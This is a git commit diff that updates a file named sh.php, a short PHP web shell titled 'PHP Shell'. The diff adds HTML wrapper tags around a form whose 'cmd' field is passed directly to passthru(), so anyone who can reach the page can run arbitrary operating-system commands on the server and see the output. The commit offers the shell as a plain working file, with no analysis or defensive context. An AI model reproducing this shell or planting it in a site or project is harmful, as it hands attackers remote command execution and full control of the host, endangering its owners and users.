577b11fe55101e25b9416f095972e0d804ed9101
m41k <maik.alberto@hotmail.com>
2025-09-22 10:50:02 -0300

    Update sh.php

--- sh.php
+++ sh.php
@@ -1,7 +1,14 @@
-<form action="" method="post">
+<html>
+ <head>
+  <title>PHP Shell</title>
+ </head>
+ <body>
+ <form action="" method="post">
  <input type="text" name="cmd" />
  <input type="submit" value=".:"/>
 </form>
 <pre>
 <?php echo passthru($_POST["cmd"]); ?>
 </pre>
+</body>
+</html>
